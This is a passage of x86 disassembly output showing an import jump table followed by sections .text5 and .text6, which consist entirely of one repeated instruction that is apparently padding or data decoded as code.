  455628:	jmp    DWORD PTR ds:0x456d18
  45562e:	jmp    DWORD PTR ds:0x456d1c
  455634:	jmp    DWORD PTR ds:0x456d20
  45563a:	jmp    DWORD PTR ds:0x456d24
  455640:	jmp    DWORD PTR ds:0x456d28
  455646:	jmp    DWORD PTR ds:0x456d2c
  45564c:	jmp    DWORD PTR ds:0x456d30
  455652:	jmp    DWORD PTR ds:0x456d34
  455658:	jmp    DWORD PTR ds:0x456d38
  45565e:	jmp    DWORD PTR ds:0x456d3c
  455664:	jmp    DWORD PTR ds:0x456d40
  45566a:	jmp    DWORD PTR ds:0x456d44
  455670:	jmp    DWORD PTR ds:0x456d48
  455676:	jmp    DWORD PTR ds:0x456d4c
  45567c:	jmp    DWORD PTR ds:0x456d50
  455682:	jmp    DWORD PTR ds:0x456d54
  455688:	jmp    DWORD PTR ds:0x456d58
  45568e:	jmp    DWORD PTR ds:0x456d5c
  455694:	jmp    DWORD PTR ds:0x456d60
  45569a:	jmp    DWORD PTR ds:0x456d64
  4556a0:	jmp    DWORD PTR ds:0x456d68
  4556a6:	jmp    DWORD PTR ds:0x456d6c
  4556ac:	jmp    DWORD PTR ds:0x456d70
  4556b2:	jmp    DWORD PTR ds:0x456d74
  4556b8:	jmp    DWORD PTR ds:0x456d78
  4556be:	jmp    DWORD PTR ds:0x456d7c
  4556c4:	jmp    DWORD PTR ds:0x456d80
  4556ca:	jmp    DWORD PTR ds:0x456d84
  4556d0:	jmp    DWORD PTR ds:0x456d88
  4556d6:	jmp    DWORD PTR ds:0x456d8c
  4556dc:	jmp    DWORD PTR ds:0x456d90
  4556e2:	jmp    DWORD PTR ds:0x456d94
  4556e8:	jmp    DWORD PTR ds:0x456d98
  4556ee:	jmp    DWORD PTR ds:0x456d9c
  4556f4:	jmp    DWORD PTR ds:0x456da0
  4556fa:	jmp    DWORD PTR ds:0x456da4
  455700:	jmp    DWORD PTR ds:0x456da8
  455706:	jmp    DWORD PTR ds:0x456dac
  45570c:	jmp    DWORD PTR ds:0x456db0
  455712:	jmp    DWORD PTR ds:0x456db4
  455718:	jmp    DWORD PTR ds:0x456db8
  45571e:	jmp    DWORD PTR ds:0x456dbc
  455724:	jmp    DWORD PTR ds:0x456dc0
  45572a:	jmp    DWORD PTR ds:0x456dc4
  455730:	jmp    DWORD PTR ds:0x456dc8
  455736:	jmp    DWORD PTR ds:0x456dcc
  45573c:	jmp    DWORD PTR ds:0x456dd0
  455742:	jmp    DWORD PTR ds:0x456dd4
  455748:	jmp    DWORD PTR ds:0x456dd8
  45574e:	jmp    DWORD PTR ds:0x456ddc
  455754:	jmp    DWORD PTR ds:0x456de0
  45575a:	jmp    DWORD PTR ds:0x456de4
  455760:	jmp    DWORD PTR ds:0x456de8
  455766:	jmp    DWORD PTR ds:0x456dec
  45576c:	jmp    DWORD PTR ds:0x456df0
  455772:	jmp    DWORD PTR ds:0x456df4
  455778:	jmp    DWORD PTR ds:0x456df8
  45577e:	jmp    DWORD PTR ds:0x456dfc
  455784:	jmp    DWORD PTR ds:0x456e00
  45578a:	jmp    DWORD PTR ds:0x456e04
  455790:	jmp    DWORD PTR ds:0x456e08
  455796:	jmp    DWORD PTR ds:0x456e0c
  45579c:	jmp    DWORD PTR ds:0x456e10
  4557a2:	jmp    DWORD PTR ds:0x456e14
  4557a8:	jmp    DWORD PTR ds:0x456e18
  4557ae:	jmp    DWORD PTR ds:0x456e1c
  4557b4:	jmp    DWORD PTR ds:0x456e20
  4557ba:	jmp    DWORD PTR ds:0x456e24
  4557c0:	jmp    DWORD PTR ds:0x456e28
  4557c6:	jmp    DWORD PTR ds:0x456e2c
  4557cc:	jmp    DWORD PTR ds:0x456e30
  4557d2:	jmp    DWORD PTR ds:0x456e34
  4557d8:	jmp    DWORD PTR ds:0x456e38
  4557de:	jmp    DWORD PTR ds:0x456e3c

Disassembly of section .text5:

00459000 <.text5>:
  459000:	add    DWORD PTR [ecx],eax
  459002:	add    DWORD PTR [ecx],eax
  459004:	add    DWORD PTR [ecx],eax
  459006:	add    DWORD PTR [ecx],eax
  459008:	add    DWORD PTR [ecx],eax
  45900a:	add    DWORD PTR [ecx],eax
  45900c:	add    DWORD PTR [ecx],eax
  45900e:	add    DWORD PTR [ecx],eax
  459010:	add    DWORD PTR [ecx],eax
  459012:	add    DWORD PTR [ecx],eax
  459014:	add    DWORD PTR [ecx],eax
  459016:	add    DWORD PTR [ecx],eax
  459018:	add    DWORD PTR [ecx],eax
  45901a:	add    DWORD PTR [ecx],eax
  45901c:	add    DWORD PTR [ecx],eax
  45901e:	add    DWORD PTR [ecx],eax
  459020:	add    DWORD PTR [ecx],eax
  459022:	add    DWORD PTR [ecx],eax
  459024:	add    DWORD PTR [ecx],eax
  459026:	add    DWORD PTR [ecx],eax
  459028:	add    DWORD PTR [ecx],eax
  45902a:	add    DWORD PTR [ecx],eax
  45902c:	add    DWORD PTR [ecx],eax
  45902e:	add    DWORD PTR [ecx],eax
  459030:	add    DWORD PTR [ecx],eax
  459032:	add    DWORD PTR [ecx],eax
  459034:	add    DWORD PTR [ecx],eax
  459036:	add    DWORD PTR [ecx],eax
  459038:	add    DWORD PTR [ecx],eax
  45903a:	add    DWORD PTR [ecx],eax
  45903c:	add    DWORD PTR [ecx],eax
  45903e:	add    DWORD PTR [ecx],eax
  459040:	add    DWORD PTR [ecx],eax
  459042:	add    DWORD PTR [ecx],eax
  459044:	add    DWORD PTR [ecx],eax
  459046:	add    DWORD PTR [ecx],eax
  459048:	add    DWORD PTR [ecx],eax
  45904a:	add    DWORD PTR [ecx],eax
  45904c:	add    DWORD PTR [ecx],eax
  45904e:	add    DWORD PTR [ecx],eax
  459050:	add    DWORD PTR [ecx],eax
  459052:	add    DWORD PTR [ecx],eax
  459054:	add    DWORD PTR [ecx],eax
  459056:	add    DWORD PTR [ecx],eax
  459058:	add    DWORD PTR [ecx],eax
  45905a:	add    DWORD PTR [ecx],eax
  45905c:	add    DWORD PTR [ecx],eax
  45905e:	add    DWORD PTR [ecx],eax
  459060:	add    DWORD PTR [ecx],eax
  459062:	add    DWORD PTR [ecx],eax
  459064:	add    DWORD PTR [ecx],eax
  459066:	add    DWORD PTR [ecx],eax
  459068:	add    DWORD PTR [ecx],eax
  45906a:	add    DWORD PTR [ecx],eax
  45906c:	add    DWORD PTR [ecx],eax
  45906e:	add    DWORD PTR [ecx],eax
  459070:	add    DWORD PTR [ecx],eax
  459072:	add    DWORD PTR [ecx],eax
  459074:	add    DWORD PTR [ecx],eax
  459076:	add    DWORD PTR [ecx],eax
  459078:	add    DWORD PTR [ecx],eax
  45907a:	add    DWORD PTR [ecx],eax
  45907c:	add    DWORD PTR [ecx],eax
  45907e:	add    DWORD PTR [ecx],eax
  459080:	add    DWORD PTR [ecx],eax
  459082:	add    DWORD PTR [ecx],eax
  459084:	add    DWORD PTR [ecx],eax
  459086:	add    DWORD PTR [ecx],eax
  459088:	add    DWORD PTR [ecx],eax
  45908a:	add    DWORD PTR [ecx],eax
  45908c:	add    DWORD PTR [ecx],eax
  45908e:	add    DWORD PTR [ecx],eax
  459090:	add    DWORD PTR [ecx],eax
  459092:	add    DWORD PTR [ecx],eax
  459094:	add    DWORD PTR [ecx],eax
  459096:	add    DWORD PTR [ecx],eax
  459098:	add    DWORD PTR [ecx],eax
  45909a:	add    DWORD PTR [ecx],eax
  45909c:	add    DWORD PTR [ecx],eax
  45909e:	add    DWORD PTR [ecx],eax
  4590a0:	add    DWORD PTR [ecx],eax
  4590a2:	add    DWORD PTR [ecx],eax
  4590a4:	add    DWORD PTR [ecx],eax
  4590a6:	add    DWORD PTR [ecx],eax
  4590a8:	add    DWORD PTR [ecx],eax
  4590aa:	add    DWORD PTR [ecx],eax
  4590ac:	add    DWORD PTR [ecx],eax
  4590ae:	add    DWORD PTR [ecx],eax
  4590b0:	add    DWORD PTR [ecx],eax
  4590b2:	add    DWORD PTR [ecx],eax
  4590b4:	add    DWORD PTR [ecx],eax
  4590b6:	add    DWORD PTR [ecx],eax
  4590b8:	add    DWORD PTR [ecx],eax
  4590ba:	add    DWORD PTR [ecx],eax
  4590bc:	add    DWORD PTR [ecx],eax
  4590be:	add    DWORD PTR [ecx],eax
  4590c0:	add    DWORD PTR [ecx],eax
  4590c2:	add    DWORD PTR [ecx],eax
  4590c4:	add    DWORD PTR [ecx],eax
  4590c6:	add    DWORD PTR [ecx],eax
  4590c8:	add    DWORD PTR [ecx],eax
  4590ca:	add    DWORD PTR [ecx],eax
  4590cc:	add    DWORD PTR [ecx],eax
  4590ce:	add    DWORD PTR [ecx],eax
  4590d0:	add    DWORD PTR [ecx],eax
  4590d2:	add    DWORD PTR [ecx],eax
  4590d4:	add    DWORD PTR [ecx],eax
  4590d6:	add    DWORD PTR [ecx],eax
  4590d8:	add    DWORD PTR [ecx],eax
  4590da:	add    DWORD PTR [ecx],eax
  4590dc:	add    DWORD PTR [ecx],eax
  4590de:	add    DWORD PTR [ecx],eax
  4590e0:	add    DWORD PTR [ecx],eax
  4590e2:	add    DWORD PTR [ecx],eax
  4590e4:	add    DWORD PTR [ecx],eax
  4590e6:	add    DWORD PTR [ecx],eax
  4590e8:	add    DWORD PTR [ecx],eax
  4590ea:	add    DWORD PTR [ecx],eax
  4590ec:	add    DWORD PTR [ecx],eax
  4590ee:	add    DWORD PTR [ecx],eax
  4590f0:	add    DWORD PTR [ecx],eax
  4590f2:	add    DWORD PTR [ecx],eax
  4590f4:	add    DWORD PTR [ecx],eax
  4590f6:	add    DWORD PTR [ecx],eax
  4590f8:	add    DWORD PTR [ecx],eax
  4590fa:	add    DWORD PTR [ecx],eax
  4590fc:	add    DWORD PTR [ecx],eax
  4590fe:	add    DWORD PTR [ecx],eax
  459100:	add    DWORD PTR [ecx],eax
  459102:	add    DWORD PTR [ecx],eax
  459104:	add    DWORD PTR [ecx],eax
  459106:	add    DWORD PTR [ecx],eax
  459108:	add    DWORD PTR [ecx],eax
  45910a:	add    DWORD PTR [ecx],eax
  45910c:	add    DWORD PTR [ecx],eax
  45910e:	add    DWORD PTR [ecx],eax
  459110:	add    DWORD PTR [ecx],eax
  459112:	add    DWORD PTR [ecx],eax
  459114:	add    DWORD PTR [ecx],eax
  459116:	add    DWORD PTR [ecx],eax
  459118:	add    DWORD PTR [ecx],eax
  45911a:	add    DWORD PTR [ecx],eax
  45911c:	add    DWORD PTR [ecx],eax
  45911e:	add    DWORD PTR [ecx],eax
  459120:	add    DWORD PTR [ecx],eax
  459122:	add    DWORD PTR [ecx],eax
  459124:	add    DWORD PTR [ecx],eax
  459126:	add    DWORD PTR [ecx],eax
  459128:	add    DWORD PTR [ecx],eax
  45912a:	add    DWORD PTR [ecx],eax
  45912c:	add    DWORD PTR [ecx],eax
  45912e:	add    DWORD PTR [ecx],eax
  459130:	add    DWORD PTR [ecx],eax
  459132:	add    DWORD PTR [ecx],eax
  459134:	add    DWORD PTR [ecx],eax
  459136:	add    DWORD PTR [ecx],eax
  459138:	add    DWORD PTR [ecx],eax
  45913a:	add    DWORD PTR [ecx],eax
  45913c:	add    DWORD PTR [ecx],eax
  45913e:	add    DWORD PTR [ecx],eax
  459140:	add    DWORD PTR [ecx],eax
  459142:	add    DWORD PTR [ecx],eax
  459144:	add    DWORD PTR [ecx],eax
  459146:	add    DWORD PTR [ecx],eax
  459148:	add    DWORD PTR [ecx],eax
  45914a:	add    DWORD PTR [ecx],eax
  45914c:	add    DWORD PTR [ecx],eax
  45914e:	add    DWORD PTR [ecx],eax
  459150:	add    DWORD PTR [ecx],eax
  459152:	add    DWORD PTR [ecx],eax
  459154:	add    DWORD PTR [ecx],eax
  459156:	add    DWORD PTR [ecx],eax
  459158:	add    DWORD PTR [ecx],eax
  45915a:	add    DWORD PTR [ecx],eax
  45915c:	add    DWORD PTR [ecx],eax
  45915e:	add    DWORD PTR [ecx],eax
  459160:	add    DWORD PTR [ecx],eax
  459162:	add    DWORD PTR [ecx],eax
  459164:	add    DWORD PTR [ecx],eax
  459166:	add    DWORD PTR [ecx],eax
  459168:	add    DWORD PTR [ecx],eax
  45916a:	add    DWORD PTR [ecx],eax
  45916c:	add    DWORD PTR [ecx],eax
  45916e:	add    DWORD PTR [ecx],eax
  459170:	add    DWORD PTR [ecx],eax
  459172:	add    DWORD PTR [ecx],eax
  459174:	add    DWORD PTR [ecx],eax
  459176:	add    DWORD PTR [ecx],eax
  459178:	add    DWORD PTR [ecx],eax
  45917a:	add    DWORD PTR [ecx],eax
  45917c:	add    DWORD PTR [ecx],eax
  45917e:	add    DWORD PTR [ecx],eax
  459180:	add    DWORD PTR [ecx],eax
  459182:	add    DWORD PTR [ecx],eax
  459184:	add    DWORD PTR [ecx],eax
  459186:	add    DWORD PTR [ecx],eax
  459188:	add    DWORD PTR [ecx],eax
  45918a:	add    DWORD PTR [ecx],eax
  45918c:	add    DWORD PTR [ecx],eax
  45918e:	add    DWORD PTR [ecx],eax
  459190:	add    DWORD PTR [ecx],eax
  459192:	add    DWORD PTR [ecx],eax
  459194:	add    DWORD PTR [ecx],eax
  459196:	add    DWORD PTR [ecx],eax
  459198:	add    DWORD PTR [ecx],eax
  45919a:	add    DWORD PTR [ecx],eax
  45919c:	add    DWORD PTR [ecx],eax
  45919e:	add    DWORD PTR [ecx],eax
  4591a0:	add    DWORD PTR [ecx],eax
  4591a2:	add    DWORD PTR [ecx],eax
  4591a4:	add    DWORD PTR [ecx],eax
  4591a6:	add    DWORD PTR [ecx],eax
  4591a8:	add    DWORD PTR [ecx],eax
  4591aa:	add    DWORD PTR [ecx],eax
  4591ac:	add    DWORD PTR [ecx],eax
  4591ae:	add    DWORD PTR [ecx],eax
  4591b0:	add    DWORD PTR [ecx],eax
  4591b2:	add    DWORD PTR [ecx],eax
  4591b4:	add    DWORD PTR [ecx],eax
  4591b6:	add    DWORD PTR [ecx],eax
  4591b8:	add    DWORD PTR [ecx],eax
  4591ba:	add    DWORD PTR [ecx],eax
  4591bc:	add    DWORD PTR [ecx],eax
  4591be:	add    DWORD PTR [ecx],eax
  4591c0:	add    DWORD PTR [ecx],eax
  4591c2:	add    DWORD PTR [ecx],eax
  4591c4:	add    DWORD PTR [ecx],eax
  4591c6:	add    DWORD PTR [ecx],eax
  4591c8:	add    DWORD PTR [ecx],eax
  4591ca:	add    DWORD PTR [ecx],eax
  4591cc:	add    DWORD PTR [ecx],eax
  4591ce:	add    DWORD PTR [ecx],eax
  4591d0:	add    DWORD PTR [ecx],eax
  4591d2:	add    DWORD PTR [ecx],eax
  4591d4:	add    DWORD PTR [ecx],eax
  4591d6:	add    DWORD PTR [ecx],eax
  4591d8:	add    DWORD PTR [ecx],eax
  4591da:	add    DWORD PTR [ecx],eax
  4591dc:	add    DWORD PTR [ecx],eax
  4591de:	add    DWORD PTR [ecx],eax
  4591e0:	add    DWORD PTR [ecx],eax
  4591e2:	add    DWORD PTR [ecx],eax
  4591e4:	add    DWORD PTR [ecx],eax
  4591e6:	add    DWORD PTR [ecx],eax
  4591e8:	add    DWORD PTR [ecx],eax
  4591ea:	add    DWORD PTR [ecx],eax
  4591ec:	add    DWORD PTR [ecx],eax
  4591ee:	add    DWORD PTR [ecx],eax
  4591f0:	add    DWORD PTR [ecx],eax
  4591f2:	add    DWORD PTR [ecx],eax
  4591f4:	add    DWORD PTR [ecx],eax
  4591f6:	add    DWORD PTR [ecx],eax
  4591f8:	add    DWORD PTR [ecx],eax
  4591fa:	add    DWORD PTR [ecx],eax
  4591fc:	add    DWORD PTR [ecx],eax
  4591fe:	add    DWORD PTR [ecx],eax
  459200:	add    DWORD PTR [ecx],eax
  459202:	add    DWORD PTR [ecx],eax
  459204:	add    DWORD PTR [ecx],eax
  459206:	add    DWORD PTR [ecx],eax
  459208:	add    DWORD PTR [ecx],eax
  45920a:	add    DWORD PTR [ecx],eax
  45920c:	add    DWORD PTR [ecx],eax
  45920e:	add    DWORD PTR [ecx],eax
  459210:	add    DWORD PTR [ecx],eax
  459212:	add    DWORD PTR [ecx],eax
  459214:	add    DWORD PTR [ecx],eax
  459216:	add    DWORD PTR [ecx],eax
  459218:	add    DWORD PTR [ecx],eax
  45921a:	add    DWORD PTR [ecx],eax
  45921c:	add    DWORD PTR [ecx],eax
  45921e:	add    DWORD PTR [ecx],eax
  459220:	add    DWORD PTR [ecx],eax
  459222:	add    DWORD PTR [ecx],eax
  459224:	add    DWORD PTR [ecx],eax
  459226:	add    DWORD PTR [ecx],eax
  459228:	add    DWORD PTR [ecx],eax
  45922a:	add    DWORD PTR [ecx],eax
  45922c:	add    DWORD PTR [ecx],eax
  45922e:	add    DWORD PTR [ecx],eax
  459230:	add    DWORD PTR [ecx],eax
  459232:	add    DWORD PTR [ecx],eax
  459234:	add    DWORD PTR [ecx],eax
  459236:	add    DWORD PTR [ecx],eax
  459238:	add    DWORD PTR [ecx],eax
  45923a:	add    DWORD PTR [ecx],eax
  45923c:	add    DWORD PTR [ecx],eax
  45923e:	add    DWORD PTR [ecx],eax
  459240:	add    DWORD PTR [ecx],eax
  459242:	add    DWORD PTR [ecx],eax
  459244:	add    DWORD PTR [ecx],eax
  459246:	add    DWORD PTR [ecx],eax
  459248:	add    DWORD PTR [ecx],eax
  45924a:	add    DWORD PTR [ecx],eax
  45924c:	add    DWORD PTR [ecx],eax
  45924e:	add    DWORD PTR [ecx],eax
  459250:	add    DWORD PTR [ecx],eax
  459252:	add    DWORD PTR [ecx],eax
  459254:	add    DWORD PTR [ecx],eax
  459256:	add    DWORD PTR [ecx],eax
  459258:	add    DWORD PTR [ecx],eax
  45925a:	add    DWORD PTR [ecx],eax
  45925c:	add    DWORD PTR [ecx],eax
  45925e:	add    DWORD PTR [ecx],eax
  459260:	add    DWORD PTR [ecx],eax
  459262:	add    DWORD PTR [ecx],eax
  459264:	add    DWORD PTR [ecx],eax
  459266:	add    DWORD PTR [ecx],eax
  459268:	add    DWORD PTR [ecx],eax
  45926a:	add    DWORD PTR [ecx],eax
  45926c:	add    DWORD PTR [ecx],eax
  45926e:	add    DWORD PTR [ecx],eax
  459270:	add    DWORD PTR [ecx],eax
  459272:	add    DWORD PTR [ecx],eax
  459274:	add    DWORD PTR [ecx],eax
  459276:	add    DWORD PTR [ecx],eax
  459278:	add    DWORD PTR [ecx],eax
  45927a:	add    DWORD PTR [ecx],eax
  45927c:	add    DWORD PTR [ecx],eax
  45927e:	add    DWORD PTR [ecx],eax
  459280:	add    DWORD PTR [ecx],eax
  459282:	add    DWORD PTR [ecx],eax
  459284:	add    DWORD PTR [ecx],eax
  459286:	add    DWORD PTR [ecx],eax
  459288:	add    DWORD PTR [ecx],eax
  45928a:	add    DWORD PTR [ecx],eax
  45928c:	add    DWORD PTR [ecx],eax
  45928e:	add    DWORD PTR [ecx],eax
  459290:	add    DWORD PTR [ecx],eax
  459292:	add    DWORD PTR [ecx],eax
  459294:	add    DWORD PTR [ecx],eax
  459296:	add    DWORD PTR [ecx],eax
  459298:	add    DWORD PTR [ecx],eax
  45929a:	add    DWORD PTR [ecx],eax
  45929c:	add    DWORD PTR [ecx],eax
  45929e:	add    DWORD PTR [ecx],eax
  4592a0:	add    DWORD PTR [ecx],eax
  4592a2:	add    DWORD PTR [ecx],eax
  4592a4:	add    DWORD PTR [ecx],eax
  4592a6:	add    DWORD PTR [ecx],eax
  4592a8:	add    DWORD PTR [ecx],eax
  4592aa:	add    DWORD PTR [ecx],eax
  4592ac:	add    DWORD PTR [ecx],eax
  4592ae:	add    DWORD PTR [ecx],eax
  4592b0:	add    DWORD PTR [ecx],eax
  4592b2:	add    DWORD PTR [ecx],eax
  4592b4:	add    DWORD PTR [ecx],eax
  4592b6:	add    DWORD PTR [ecx],eax
  4592b8:	add    DWORD PTR [ecx],eax
  4592ba:	add    DWORD PTR [ecx],eax
  4592bc:	add    DWORD PTR [ecx],eax
  4592be:	add    DWORD PTR [ecx],eax
  4592c0:	add    DWORD PTR [ecx],eax
  4592c2:	add    DWORD PTR [ecx],eax
  4592c4:	add    DWORD PTR [ecx],eax
  4592c6:	add    DWORD PTR [ecx],eax
  4592c8:	add    DWORD PTR [ecx],eax
  4592ca:	add    DWORD PTR [ecx],eax
  4592cc:	add    DWORD PTR [ecx],eax
  4592ce:	add    DWORD PTR [ecx],eax
  4592d0:	add    DWORD PTR [ecx],eax
  4592d2:	add    DWORD PTR [ecx],eax
  4592d4:	add    DWORD PTR [ecx],eax
  4592d6:	add    DWORD PTR [ecx],eax
  4592d8:	add    DWORD PTR [ecx],eax
  4592da:	add    DWORD PTR [ecx],eax
  4592dc:	add    DWORD PTR [ecx],eax
  4592de:	add    DWORD PTR [ecx],eax
  4592e0:	add    DWORD PTR [ecx],eax
  4592e2:	add    DWORD PTR [ecx],eax
  4592e4:	add    DWORD PTR [ecx],eax
  4592e6:	add    DWORD PTR [ecx],eax
  4592e8:	add    DWORD PTR [ecx],eax
  4592ea:	add    DWORD PTR [ecx],eax
  4592ec:	add    DWORD PTR [ecx],eax
  4592ee:	add    DWORD PTR [ecx],eax
  4592f0:	add    DWORD PTR [ecx],eax
  4592f2:	add    DWORD PTR [ecx],eax
  4592f4:	add    DWORD PTR [ecx],eax
  4592f6:	add    DWORD PTR [ecx],eax
  4592f8:	add    DWORD PTR [ecx],eax
  4592fa:	add    DWORD PTR [ecx],eax
  4592fc:	add    DWORD PTR [ecx],eax
  4592fe:	add    DWORD PTR [ecx],eax
  459300:	add    DWORD PTR [ecx],eax
  459302:	add    DWORD PTR [ecx],eax
  459304:	add    DWORD PTR [ecx],eax
  459306:	add    DWORD PTR [ecx],eax
  459308:	add    DWORD PTR [ecx],eax
  45930a:	add    DWORD PTR [ecx],eax
  45930c:	add    DWORD PTR [ecx],eax
  45930e:	add    DWORD PTR [ecx],eax
  459310:	add    DWORD PTR [ecx],eax
  459312:	add    DWORD PTR [ecx],eax
  459314:	add    DWORD PTR [ecx],eax
  459316:	add    DWORD PTR [ecx],eax
  459318:	add    DWORD PTR [ecx],eax
  45931a:	add    DWORD PTR [ecx],eax
  45931c:	add    DWORD PTR [ecx],eax
  45931e:	add    DWORD PTR [ecx],eax
  459320:	add    DWORD PTR [ecx],eax
  459322:	add    DWORD PTR [ecx],eax
  459324:	add    DWORD PTR [ecx],eax
  459326:	add    DWORD PTR [ecx],eax
  459328:	add    DWORD PTR [ecx],eax
  45932a:	add    DWORD PTR [ecx],eax
  45932c:	add    DWORD PTR [ecx],eax
  45932e:	add    DWORD PTR [ecx],eax
  459330:	add    DWORD PTR [ecx],eax
  459332:	add    DWORD PTR [ecx],eax
  459334:	add    DWORD PTR [ecx],eax
  459336:	add    DWORD PTR [ecx],eax
  459338:	add    DWORD PTR [ecx],eax
  45933a:	add    DWORD PTR [ecx],eax
  45933c:	add    DWORD PTR [ecx],eax
  45933e:	add    DWORD PTR [ecx],eax
  459340:	add    DWORD PTR [ecx],eax
  459342:	add    DWORD PTR [ecx],eax
  459344:	add    DWORD PTR [ecx],eax
  459346:	add    DWORD PTR [ecx],eax
  459348:	add    DWORD PTR [ecx],eax
  45934a:	add    DWORD PTR [ecx],eax
  45934c:	add    DWORD PTR [ecx],eax
  45934e:	add    DWORD PTR [ecx],eax
  459350:	add    DWORD PTR [ecx],eax
  459352:	add    DWORD PTR [ecx],eax
  459354:	add    DWORD PTR [ecx],eax
  459356:	add    DWORD PTR [ecx],eax
  459358:	add    DWORD PTR [ecx],eax
  45935a:	add    DWORD PTR [ecx],eax
  45935c:	add    DWORD PTR [ecx],eax
  45935e:	add    DWORD PTR [ecx],eax
  459360:	add    DWORD PTR [ecx],eax
  459362:	add    DWORD PTR [ecx],eax
  459364:	add    DWORD PTR [ecx],eax
  459366:	add    DWORD PTR [ecx],eax
  459368:	add    DWORD PTR [ecx],eax
  45936a:	add    DWORD PTR [ecx],eax
  45936c:	add    DWORD PTR [ecx],eax
  45936e:	add    DWORD PTR [ecx],eax
  459370:	add    DWORD PTR [ecx],eax
  459372:	add    DWORD PTR [ecx],eax
  459374:	add    DWORD PTR [ecx],eax
  459376:	add    DWORD PTR [ecx],eax
  459378:	add    DWORD PTR [ecx],eax
  45937a:	add    DWORD PTR [ecx],eax
  45937c:	add    DWORD PTR [ecx],eax
  45937e:	add    DWORD PTR [ecx],eax
  459380:	add    DWORD PTR [ecx],eax
  459382:	add    DWORD PTR [ecx],eax
  459384:	add    DWORD PTR [ecx],eax
  459386:	add    DWORD PTR [ecx],eax
  459388:	add    DWORD PTR [ecx],eax
  45938a:	add    DWORD PTR [ecx],eax
  45938c:	add    DWORD PTR [ecx],eax
  45938e:	add    DWORD PTR [ecx],eax
  459390:	add    DWORD PTR [ecx],eax
  459392:	add    DWORD PTR [ecx],eax
  459394:	add    DWORD PTR [ecx],eax
  459396:	add    DWORD PTR [ecx],eax
  459398:	add    DWORD PTR [ecx],eax
  45939a:	add    DWORD PTR [ecx],eax
  45939c:	add    DWORD PTR [ecx],eax
  45939e:	add    DWORD PTR [ecx],eax
  4593a0:	add    DWORD PTR [ecx],eax
  4593a2:	add    DWORD PTR [ecx],eax
  4593a4:	add    DWORD PTR [ecx],eax
  4593a6:	add    DWORD PTR [ecx],eax
  4593a8:	add    DWORD PTR [ecx],eax
  4593aa:	add    DWORD PTR [ecx],eax
  4593ac:	add    DWORD PTR [ecx],eax
  4593ae:	add    DWORD PTR [ecx],eax
  4593b0:	add    DWORD PTR [ecx],eax
  4593b2:	add    DWORD PTR [ecx],eax
  4593b4:	add    DWORD PTR [ecx],eax
  4593b6:	add    DWORD PTR [ecx],eax
  4593b8:	add    DWORD PTR [ecx],eax
  4593ba:	add    DWORD PTR [ecx],eax
  4593bc:	add    DWORD PTR [ecx],eax
  4593be:	add    DWORD PTR [ecx],eax
  4593c0:	add    DWORD PTR [ecx],eax
  4593c2:	add    DWORD PTR [ecx],eax
  4593c4:	add    DWORD PTR [ecx],eax
  4593c6:	add    DWORD PTR [ecx],eax
  4593c8:	add    DWORD PTR [ecx],eax
  4593ca:	add    DWORD PTR [ecx],eax
  4593cc:	add    DWORD PTR [ecx],eax
  4593ce:	add    DWORD PTR [ecx],eax
  4593d0:	add    DWORD PTR [ecx],eax
  4593d2:	add    DWORD PTR [ecx],eax
  4593d4:	add    DWORD PTR [ecx],eax
  4593d6:	add    DWORD PTR [ecx],eax
  4593d8:	add    DWORD PTR [ecx],eax
  4593da:	add    DWORD PTR [ecx],eax
  4593dc:	add    DWORD PTR [ecx],eax
  4593de:	add    DWORD PTR [ecx],eax
  4593e0:	add    DWORD PTR [ecx],eax
  4593e2:	add    DWORD PTR [ecx],eax
  4593e4:	add    DWORD PTR [ecx],eax
  4593e6:	add    DWORD PTR [ecx],eax

Disassembly of section .text6:

0045a000 <.text6>:
  45a000:	add    DWORD PTR [ecx],eax
  45a002:	add    DWORD PTR [ecx],eax
  45a004:	add    DWORD PTR [ecx],eax
  45a006:	add    DWORD PTR [ecx],eax
  45a008:	add    DWORD PTR [ecx],eax
  45a00a:	add    DWORD PTR [ecx],eax
  45a00c:	add    DWORD PTR [ecx],eax
  45a00e:	add    DWORD PTR [ecx],eax
  45a010:	add    DWORD PTR [ecx],eax
  45a012:	add    DWORD PTR [ecx],eax
  45a014:	add    DWORD PTR [ecx],eax
  45a016:	add    DWORD PTR [ecx],eax
  45a018:	add    DWORD PTR [ecx],eax
  45a01a:	add    DWORD PTR [ecx],eax
  45a01c:	add    DWORD PTR [ecx],eax
  45a01e:	add    DWORD PTR [ecx],eax
  45a020:	add    DWORD PTR [ecx],eax
  45a022:	add    DWORD PTR [ecx],eax
  45a024:	add    DWORD PTR [ecx],eax
  45a026:	add    DWORD PTR [ecx],eax
  45a028:	add    DWORD PTR [ecx],eax
  45a02a:	add    DWORD PTR [ecx],eax
  45a02c:	add    DWORD PTR [ecx],eax
  45a02e:	add    DWORD PTR [ecx],eax
  45a030:	add    DWORD PTR [ecx],eax
  45a032:	add    DWORD PTR [ecx],eax
  45a034:	add    DWORD PTR [ecx],eax
  45a036:	add    DWORD PTR [ecx],eax
  45a038:	add    DWORD PTR [ecx],eax
  45a03a:	add    DWORD PTR [ecx],eax
  45a03c:	add    DWORD PTR [ecx],eax
  45a03e:	add    DWORD PTR [ecx],eax
  45a040:	add    DWORD PTR [ecx],eax
  45a042:	add    DWORD PTR [ecx],eax
  45a044:	add    DWORD PTR [ecx],eax
  45a046:	add    DWORD PTR [ecx],eax
  45a048:	add    DWORD PTR [ecx],eax
  45a04a:	add    DWORD PTR [ecx],eax
  45a04c:	add    DWORD PTR [ecx],eax
  45a04e:	add    DWORD PTR [ecx],eax
  45a050:	add    DWORD PTR [ecx],eax
  45a052:	add    DWORD PTR [ecx],eax
  45a054:	add    DWORD PTR [ecx],eax
  45a056:	add    DWORD PTR [ecx],eax
  45a058:	add    DWORD PTR [ecx],eax
  45a05a:	add    DWORD PTR [ecx],eax
  45a05c:	add    DWORD PTR [ecx],eax
  45a05e:	add    DWORD PTR [ecx],eax
  45a060:	add    DWORD PTR [ecx],eax
  45a062:	add    DWORD PTR [ecx],eax
  45a064:	add    DWORD PTR [ecx],eax
  45a066:	add    DWORD PTR [ecx],eax
  45a068:	add    DWORD PTR [ecx],eax
  45a06a:	add    DWORD PTR [ecx],eax
  45a06c:	add    DWORD PTR [ecx],eax
  45a06e:	add    DWORD PTR [ecx],eax
  45a070:	add    DWORD PTR [ecx],eax
  45a072:	add    DWORD PTR [ecx],eax
  45a074:	add    DWORD PTR [ecx],eax
  45a076:	add    DWORD PTR [ecx],eax
  45a078:	add    DWORD PTR [ecx],eax
  45a07a:	add    DWORD PTR [ecx],eax
  45a07c:	add    DWORD PTR [ecx],eax
  45a07e:	add    DWORD PTR [ecx],eax
  45a080:	add    DWORD PTR [ecx],eax
  45a082:	add    DWORD PTR [ecx],eax
